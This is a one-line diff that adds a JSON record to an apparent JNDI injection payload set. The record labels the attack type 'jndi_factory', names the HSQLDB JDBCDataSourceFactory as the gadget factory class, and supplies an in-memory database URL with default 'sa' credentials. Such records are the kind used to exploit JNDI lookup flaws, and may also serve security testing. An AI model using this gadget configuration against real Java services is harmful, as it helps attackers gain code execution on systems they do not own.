@@ -1,0 +1,1 @@
+{"attack_type":"jndi_factory","factory_class":"org.hsqldb.jdbc.JDBCDataSourceFactory","reference_class":"org.hsqldb.jdbc.JDBCDataSource","factory_attrs":{"database":"jdbc:hsqldb:mem:test;sql.syntax_ora=true","user":"sa","password":""}}
